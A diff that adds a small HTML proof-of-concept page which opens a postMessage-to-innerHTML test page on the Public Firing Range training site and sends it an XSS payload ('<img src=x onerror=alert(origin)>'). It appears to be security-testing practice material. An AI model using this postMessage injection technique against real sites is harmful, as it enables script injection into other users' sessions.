@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>innerHtml test case</title>
+</head>
+<body>
+                <script>
+                        function PoC() {
+                                window.poc = open("https://public-firing-range.appspot.com/dom/toxicdom/postMessage/innerHtml");
+                                setTimeout(function() {
+                                        window.poc.postMessage('{"html":"<img src=x onerror=alert(origin)>"}', "*");
+                                }, 1000);
+                        }
+                </script>
+				<h1>here we go!</h1>
+                <button onclick="PoC()">Click me</button>
+
+</body>
+</html>
